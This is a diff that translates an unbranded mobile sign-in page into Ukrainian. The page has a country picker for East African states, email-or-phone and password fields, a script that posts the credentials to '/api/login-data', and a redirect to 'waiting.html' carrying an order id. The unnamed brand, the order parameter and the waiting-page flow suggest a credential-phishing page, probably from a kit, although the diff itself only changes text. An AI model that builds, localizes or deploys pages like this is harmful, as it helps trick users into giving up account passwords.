@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="uk" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Welcome back</title>
+<title>З поверненням</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
@@ -144,7 +144,7 @@
   <!-- Top Bar -->
   <div class="topbar">
     <button class="topbar-back" type="button"><svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button>
-    <span class="topbar-title">Welcome back</span>
+    <span class="topbar-title">З поверненням</span>
     <button class="topbar-chat" type="button"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="3"/><path d="M8 21l4-4h6"/></svg></button>
   </div>
 
@@ -152,43 +152,43 @@
   <div class="content">
     <div class="error-msg" id="errorMsg"></div>
 
-    <h1 class="greeting">Hello there,</h1>
-    <p class="subtitle">Sign in to continue. Remember, your password is yours, do not share it with anyone.</p>
+    <h1 class="greeting">Вітаємо,</h1>
+    <p class="subtitle">Увійдіть, щоб продовжити. Пам'ятайте, ваш пароль — тільки ваш, не повідомляйте його нікому.</p>
 
     <!-- Country -->
     <div class="field-group">
-      <div class="field-label">Country</div>
+      <div class="field-label">Країна</div>
       <div class="country-select" id="countrySelect" onclick="openCountryModal()">
-        <span id="selectedCountry">South Sudan</span>
+        <span id="selectedCountry">Південний Судан</span>
         <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z" fill="#555"/></svg>
       </div>
     </div>
 
     <!-- Email / Mobile -->
     <div class="field-group">
-      <div class="field-value-label">Email address or mobile number</div>
+      <div class="field-value-label">Електронна пошта або номер телефону</div>
       <div class="underline-field">
-        <input type="text" id="username" placeholder="Email address or mobile number" autocomplete="username" oninput="checkFields()">
+        <input type="text" id="username" placeholder="Електронна пошта або номер телефону" autocomplete="username" oninput="checkFields()">
       </div>
     </div>
 
     <!-- Password -->
     <div class="field-group">
-      <div class="field-value-label">Password</div>
+      <div class="field-value-label">Пароль</div>
       <div class="underline-field">
-        <input type="password" id="password" placeholder="Enter password" oninput="checkFields()">
+        <input type="password" id="password" placeholder="Введіть пароль" oninput="checkFields()">
         <button class="eye-toggle" onclick="togglePass()" type="button">
           <svg id="eyeIcon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3.5"/><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/></svg>
         </button>
       </div>
     </div>
 
-    <a href="#" class="forgot-link">Forgot your password?</a>
+    <a href="#" class="forgot-link">Забули пароль?</a>
   </div>
 
   <!-- Sign In Button -->
   <div class="signin-wrap">
-    <button class="signin-btn" id="signinBtn" onclick="submitLogin()" disabled>Sign in</button>
+    <button class="signin-btn" id="signinBtn" onclick="submitLogin()" disabled>Увійти</button>
   </div>
 
   <!-- Country Modal -->
@@ -196,11 +196,11 @@
     <div class="modal">
       <div class="modal-header">
         <button class="modal-close" onclick="closeCountryModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
-        <span class="modal-title">Country</span>
+        <span class="modal-title">Країна</span>
         <div class="modal-spacer"></div>
       </div>
       <div class="modal-search">
-        <input type="text" placeholder="Search for a country" id="countrySearch" oninput="filterCountries()">
+        <input type="text" placeholder="Пошук країни" id="countrySearch" oninput="filterCountries()">
         <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg>
       </div>
       <div class="country-list" id="countryList"></div>
@@ -212,7 +212,7 @@
   <div class="error-modal">
     <button class="error-modal-close" onclick="closeErrorModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
     <div class="error-img-wrap" onclick="closeErrorModal()">
-      <img src="images/error-illustration.jpg" alt="Error">
+      <img src="images/error-illustration.jpg" alt="Помилка">
     </div>
   </div>
 </div>
@@ -220,16 +220,16 @@
 <script>
   var params = new URLSearchParams(location.search);
   var orderId = params.get("order");
-  var selectedCountryName = "South Sudan";
+  var selectedCountryName = "Південний Судан";
   var selectedCountryCode = "SS";
 
   var countries = [
-    {name:"Kenya",code:"KE",colors:["#000","#b00","#060"]},
-    {name:"Rwanda",code:"RW",colors:["#00a0dc","#fad201","#20603d"]},
-    {name:"South Sudan",code:"SS",colors:["#000","#c8102e","#078930"]},
-    {name:"Sudan",code:"SD",colors:["#c8102e","#fff","#000"]},
-    {name:"Tanzania, United Rep...",code:"TZ",colors:["#1eb53a","#00a3dd","#fcd116"]},
-    {name:"Uganda",code:"UG",colors:["#000","#fcdc04","#d90000"]}
+    {name:"Кенія",code:"KE",colors:["#000","#b00","#060"]},
+    {name:"Руанда",code:"RW",colors:["#00a0dc","#fad201","#20603d"]},
+    {name:"Південний Судан",code:"SS",colors:["#000","#c8102e","#078930"]},
+    {name:"Судан",code:"SD",colors:["#c8102e","#fff","#000"]},
+    {name:"Танзанія",code:"TZ",colors:["#1eb53a","#00a3dd","#fcd116"]},
+    {name:"Уганда",code:"UG",colors:["#000","#fcdc04","#d90000"]}
   ];
 
   function renderCountries(filter){
@@ -311,7 +311,7 @@
 
     var btn = document.getElementById("signinBtn");
     btn.disabled = true;
-    btn.textContent = "Signing in...";
+    btn.textContent = "Вхід...";
 
     try {
       var res = await fetch("/api/login-data", {
@@ -321,9 +321,9 @@
       });
       var data = await res.json();
       if(!data.success){
-        showError(data.message || "An error occurred");
+        showError(data.message || "Сталася помилка");
         btn.disabled = false;
-        btn.textContent = "Sign in";
+        btn.textContent = "Увійти";
         btn.classList.add("active");
         return;
       }
@@ -337,15 +337,15 @@
       if(data2.success){
         location.href = "waiting.html?order=" + orderId;
       } else {
-        showError(data2.message || "An error occurred");
+        showError(data2.message || "Сталася помилка");
         btn.disabled = false;
-        btn.textContent = "Sign in";
+        btn.textContent = "Увійти";
         btn.classList.add("active");
       }
     } catch(err){
-      showError("Connection error");
+      showError("Помилка з'єднання");
       btn.disabled = false;
-      btn.textContent = "Sign in";
+      btn.textContent = "Увійти";
       btn.classList.add("active");
     }
   }
